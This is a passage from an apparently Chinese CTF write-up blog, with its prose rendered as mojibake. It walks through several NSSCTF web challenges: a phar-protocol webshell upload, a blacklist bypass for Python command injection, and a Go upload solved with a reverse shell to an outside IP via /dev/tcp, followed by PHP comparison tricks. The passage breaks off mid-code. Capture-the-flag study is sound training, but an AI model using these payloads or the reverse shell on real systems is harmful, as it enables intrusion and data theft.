PHP&gt;=5.3.0å‹ç¼©åŒ…éœ€è¦æ˜¯zipåè®®å‹ç¼©ï¼Œrarä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚æ­¥éª¤ï¼šå†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬shellã€‚phpï¼Œç„¶åç”¨zipåè®®è§£å‹ç¼©ä¸ºshell.zipã€‚ç„¶åå°†åç¼€æ”¹ä¸ºpngç­‰å…¶ä»–æ ¼å¼</strong></p><p>è¿™å°±æ˜¯pharåè®®çš„å†…å®¹ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯ä¸ºä»€ä¹ˆè¦è§£å‹æˆzipæ–‡ä»¶çš„åŸå› </p><p>è¿™é‡Œç„¶åå‹ç¼©æˆzipæ–‡ä»¶åï¼Œä¿®æ”¹åç¼€åä¸ºpng</p><p><img src="../images/image-20230327223103174.png" alt="image-20230327223103174"></p><p>ä¸Šä¼ æˆåŠŸåï¼Œä½¿ç”¨pharä¼ªåè®®ä¼ å‚</p><p><img src="../images/image-20230327223343549.png" alt="image-20230327223343549"></p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar:<span class="comment">//./upload/123.png/newpoc.phar </span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230327224532343.png" alt="image-20230327224532343"></p><p>é¢˜ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä»£ç å°±æ˜¯å¾ˆç®€é™‹ï¼Œå°±æ˜¯åœ¨/sourceé‚£ç»™äº†æºç ï¼Œç„¶ååœ¨indexå‡½æ•°å‘é€è¯·æ±‚å¹¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œ   â€”â€”-&gt;    <code>os.popen()</code></p><p>è¿™é‡Œåªè¦å°±æ˜¯ç»•è¿‡é»‘åå•çš„é—®é¢˜ï¼Œå†™ä¸ªè„šæœ¬çœ‹çœ‹å“ªäº›æ²¡æœ‰è¢«è¿‡æ»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="built_in">print</span>(black)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> waf(<span class="built_in">chr</span>(i))):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        L.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;,&#x27;, &#x27;.&#x27;, &#x27;:&#x27;, &#x27;?&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;\x7f&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>å’Œphpçš„é‚£ä¸ªåŒ¹é…è„šæœ¬å·®ä¸å¤šï¼Œä¹Ÿæ˜¯åˆ©ç”¨chræ¥å†™<br>é€‰å‡ºå¸¸ç”¨çš„ï¼ŒåŒ…æ‹¬<code>\t</code> <code>$</code> <code>&amp;</code> <code>()</code> <code>,</code> <code>.</code> <code>:</code> <code>?</code> ä»¥åŠå¤§å°å†™å­—æ¯ï¼ˆ<code>è¿‡æ»¤u n</code>)</p><p><strong>paylaod</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">cp%</span><span class="language-bash">09%24%28cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26echo%09%24%28pwd%29flag%29%09app%2Epy</span></span><br></pre></td></tr></table></figure><p><code>cp    $(cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;echo    $(pwd)flag)    app.py</code></p><p>å°±æ˜¯åˆ©ç”¨shellé‡Œé¢çš„çŸ¥è¯†æ¥å†™ï¼Œ$(xxx)è¿™ä¸ªé‡Œé¢ä¼šæ‰§è¡Œå‘½ä»¤</p><p><img src="../images/image-20230328091657655.png" alt="image-20230328091657655"></p><p>ç„¶åè¿™é‡Œå‰é¢ç»™äº†flagåœ¨æ ¹ç›®å½•äº†ï¼Œç„¶åè¿™é‡Œå°±ç›´æ¥å…ˆcdè¿”å›åˆ°æ ¹ç›®å½•ï¼Œç„¶ååœ¨ä½¿ç”¨pwdæ‹¿åˆ°/ç¬¦å·ï¼Œå› ä¸ºæ­¤æ—¶å·²ç»cdåˆ°æ ¹ç›®å½•äº†ï¼Œå¯¹flagè¿›è¡Œè¾“å‡ºï¼Œç„¶åä½¿ç”¨cpå‘½ä»¤å°†flagè¦†ç›–åˆ°app.pyå¤„ï¼Œå°±æ˜¯/sourceé‚£é‡Œ</p><h2 id="NSSRound-8-Basic-Upload-gogoggo"><a href="#NSSRound-8-Basic-Upload-gogoggo" class="headerlink" title="[NSSRound#8 Basic]Upload_gogoggo"></a>[NSSRound#8 Basic]Upload_gogoggo</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230328091957559.png" alt="image-20230328091957559"></p><p>é¢˜ç›®</p><p><img src="../images/image-20230328092016055.png" alt="image-20230328092016055"></p><p><strong>golangçš„æ–‡ä»¶ä¸Šä¼ </strong>ï¼ˆå±äºæ˜¯ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹)</p><p>è¿™é‡Œçš„è¯goå’Œphpä¸åŒï¼Œä»–æ²¡æœ‰ä¸€å¥è¯æœ¨é©¬ï¼Œæ‰€ä»¥è¿™é‡Œçš„è¯getshellæ˜¯ç”¨</p><p>go run xx.go     xx.goæ–‡ä»¶é‡Œå†™çš„å°±æ˜¯å‘½ä»¤æ‰§è¡Œä»£ç </p><p>ä¾‹å­ä»£ç </p><p>1.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    out, err := exec.Command(<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>).Output()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230328092748620.png" alt="image-20230328092748620"></p><p>è¿è¡ŒæˆåŠŸ</p><p>ä»–è¿™é‡Œæ˜¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„æ–‡ä»¶ä¸Šä¼ ï¼Œæ‰€ä»¥å°±å¯ä»¥éšä¾¿ä¸Šç‚¹ä¸œè¥¿çœ‹çœ‹ï¼Œè¿™é‡Œä¸Šä¼ äº†ä¸ª1.php</p><p><img src="../images/image-20230328190306949.png" alt="image-20230328190306949"></p><p>ä¸éš¾å‘ç°ï¼Œè¿™é‡Œä¼šæ‰§è¡Œå‘½ä»¤<code>go ä¸Šä¼ çš„æ–‡ä»¶å</code>ï¼Œä¿®æ”¹æ–‡ä»¶åä¸ºhelpè¯•è¯•</p><p><img src="../images/image-20230328190433293.png" alt="image-20230328190433293"></p><p>å¯ä»¥å‘ç°åå°å‘½ä»¤æ‰§è¡Œçš„ä»£ç å¤§æ¦‚é•¿è¿™æ ·<code>å‘½ä»¤æ‰§è¡Œ(go æ–‡ä»¶åå‰ç¼€ æ–‡ä»¶è·¯å¾„)</code>ï¼Œæ‰€ä»¥è¿™é‡Œæ„é€ ä¸€ä¸‹æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸Šä¼ ä¸€ä¸ªrun.goæ–‡ä»¶ï¼Œåˆ™ä¼šæ‰§è¡Œ<code>go run run.go</code></p><p><strong>å‰é¢ä¸Šä¼ 1.phpåªæ‰§è¡Œgo 1çš„åŸå› æ˜¯æ²¡æœ‰1è¿™ä¸ªå‘½ä»¤</strong></p><p>è¿™é‡Œæˆ‘ä»¬å°±ç›´æ¥ç”¨ç½‘ä¸Šæœ‰çš„ä»£ç è¿›è¡Œä¿®æ”¹æ¥åå¼¹shell</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/666 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flagä¸€ä¸ªåœ¨æ ¹ç›®å½•ä¸€ä¸ªåœ¨/home/galf</p><h2 id="NSSRound-7-Team-0o0"><a href="#NSSRound-7-Team-0o0" class="headerlink" title="[NSSRound#7 Team]0o0"></a>[NSSRound#7 Team]0o0</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230328192745454.png" alt="image-20230328192745454"></p><p>é¢˜ç›®</p><p><img src="../images/image-20230328192754980.png" alt="image-20230328192754980"></p><p>æ‰«ä¸€ä¸‹ç›®å½•å‘ç°äº†ä¸€ä¸ªæ³„éœ²</p><p>ä¸‹è½½åå‘ç°</p><p><img src="../images/image-20230328192940974.png" alt="image-20230328192940974"></p><p>å­˜åœ¨ä¸€ä¸ªphpä»£ç ï¼Œè®¿é—®ä¹‹åæ‹¿åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125; NO0o0o0o0o!</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçœ‹èµ·æ¥æ¯”è¾ƒç»•</p><p><a href="https://blog.csdn.net/m0_64815693/article/details/128784449?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168000275616800180675463%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168000275616800180675463&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128784449-null-null.142^v76^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=%5BNSSRound%237%20Team%5D0o0&amp;spm=1018.2226.3001.4187">è¿™ç¯‡æ–‡ç« å†™çš„å¾ˆè¯¦ç»†äº†</a></p><p>åªä¸è¿‡é‡Œé¢æœ‰ä¸ªç‚¹å†™é”™äº†ï¼Œå°±æ˜¯ç»•è¿‡<code>if ($NSScTf != 114514 &amp;&amp; intval($NSScTf, 0) === 114514)</code>è¿™ä¸ªçš„æ—¶å€™</p><p><img src="../images/image-20230328195154093.png" alt="image-20230328195154093"></p><p>åº”è¯¥è¦è¿™æ ·ç»•è¿‡</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">æ¢å§¬å†™çš„å…³äºæ­»äº¡dieç»•è¿‡çš„ï¼Œè¿˜æœ‰ä¸€äº›å…³äºæ–‡ä»¶åŒ…å«çš„filter</a></p><p>å°±æ˜¯å¾ˆæœ‰å­¦ä¹ ä»·å€¼</p><h2 id="NSSRound-7-Team-ShadowFlag"><a href="#NSSRound-7-Team-ShadowFlag" class="headerlink" title="[NSSRound#7 Team]ShadowFlag"></a>[NSSRound#7 Team]ShadowFlag</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230328195559824.png" alt="image-20230328195559824"></p><p><a href="https://www.bilibili.com/video/BV1jY411S71X/?vd_source=bacfffe46b930fda5761b63367eb298c">wpè§†é¢‘åœ°å€</a></p><p>é¢˜ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span 